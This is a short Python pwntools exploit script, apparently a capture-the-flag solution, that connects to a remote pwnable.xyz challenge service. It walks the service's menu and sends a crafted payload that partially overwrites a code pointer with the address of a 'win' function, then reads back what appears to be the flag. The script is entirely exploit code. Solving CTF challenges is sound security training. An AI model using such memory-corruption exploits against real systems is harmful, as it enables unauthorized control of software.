from pwn import *

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30009)
win = 0x4009d6

p.sendafter('Name:', 'AAAABBBBCCCCDDDD')
p.sendlineafter('>', '1' )
p.sendlineafter('=', '0')
p.sendlineafter('>', '2')
p.sendlineafter('>', '3')
p.send('AAAABBBBCCCCDDDD' + p64(0x0) + '\xd6\x09\x40')
p.sendlineafter('>', '1')
print p.recvuntil('}')

